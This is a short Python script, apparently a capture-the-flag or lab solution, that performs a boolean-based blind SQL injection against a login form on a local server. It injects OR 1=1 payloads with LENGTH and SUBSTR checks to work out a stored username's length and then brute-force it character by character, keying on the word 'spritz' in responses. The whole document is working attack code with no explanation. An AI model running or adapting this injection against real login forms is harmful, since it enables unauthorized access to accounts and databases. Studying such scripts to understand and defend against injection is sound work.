import requests
import string

url = "http://127.0.0.1:5000"
alphabet = list(string.printable)

iter = 1
while iter <= 100:
	data = {
		"username": f"admin' OR 1=1 AND LENGTH(username) = {iter}/*",
		"password": "1"
	}

	response = requests.post(url, data=data)

	if "spritz" in response.text:
		print(f"Length: {iter}\n{response.text}", flush=True)
		break
		
	iter += 1

username = ''
username_length = iter
for _ in range(username_length):
	for i, a in enumerate(alphabet):
		data = {
			"username": f"admin' OR 1=1 AND SUBSTR(username, 1, {len(username) + 1}) = '{username + a}'--",
			"password": "1"
		}

		response = requests.post(url, data=data)

		if "spritz" in response.text:
			print(f"Step {i}: {a}\n{response.text}", flush=True)
			username += a
			break

print(f"Username: {username}")
